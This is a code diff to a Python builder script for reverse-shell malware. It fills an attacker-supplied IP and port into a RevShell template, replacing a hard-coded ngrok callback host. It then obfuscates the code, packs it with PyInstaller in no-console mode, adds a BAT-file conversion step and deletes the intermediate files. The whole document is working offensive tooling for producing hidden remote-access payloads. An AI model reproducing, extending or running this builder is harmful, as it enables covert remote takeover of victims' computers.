@@ -12,10 +12,10 @@ def create_file(ip, port, filename):
     # Read the original code from the template file
     with open('RevShell.py', 'r') as f:
         code = f.read()
-    
+
     # Replace the IP and port in the code with user input
     code = code.replace("('0.tcp.eu.ngrok.io', 17117)", f"('{ip}', {port})")
-    
+
     # Write the modified code to a new file with the given filename
     with open(filename, 'w') as f:
         f.write(code)
@@ -23,34 +23,44 @@ def create_file(ip, port, filename):
 def build_exe(filename):
     # Build the executable file using PyInstaller
     cmd = f"python3 compress.py {filename} {filename}Obf.py"
-    subprocess.call(cmd, shell=True)	
-    cmd = f"pyinstaller --onefile --noconsole {filename}Obf.py"
-    subprocess.call(cmd, shell=True)
+    subprocess.run(cmd, shell=True, check=True)
+    cmd = f"pyinstaller --onefile --noconsole --hidden-import cryptography {filename}Obf.py"
+    subprocess.run(cmd, shell=True, check=True)
+
+def create_bat(filenameOBF):
+    # Run Py2batConvert.py to create the BAT file
+    cmd = f"python3 Py2batConvert.py {filenameOBF}"
+    subprocess.run(cmd, shell=True, check=True)
 
 if __name__ == '__main__':
     # Get the IP, port, and filename from the command line arguments
     ip = sys.argv[1]
     port = sys.argv[2]
     filename = sys.argv[3]
-    
+    filenameOBF = filename + "Obf.py"
+
     # Create the Python file with the modified IP and port
     create_file(ip, port, filename)
-    
+
     # Build the executable file using PyInstaller
     build_exe(filename)
+
+    # Execute Py2batConvert.py to create the BAT file
+    create_bat_cmd = f"python3 Py2batConvert.py {filenameOBF}"
+    subprocess.run(create_bat_cmd, shell=True, check=True)
 
     # Remove unnecessary files	
     if platform.system() == 'Windows':
         cmd = f"del {filename}Obf.spec"
-        subprocess.call(cmd, shell=True)
+        subprocess.run(cmd, shell=True, check=True)
         cmd = f"del {filename}"
-        subprocess.call(cmd, shell=True)
+        subprocess.run(cmd, shell=True, check=True)
     else:
         cmd = f"rm -rf {filename}Obf.spec"
-        subprocess.call(cmd, shell=True)
+        subprocess.run(cmd, shell=True, check=True)
         cmd = f"rm -rf {filename}"
-        subprocess.call(cmd, shell=True)
+        subprocess.run(cmd, shell=True, check=True)
         # Granting Permissions	
         if platform.system() == 'Linux':
             cmd = f"chmod +777 {filename}Obf.py"
-            subprocess.call(cmd, shell=True)
+            subprocess.run(cmd, shell=True, check=True)
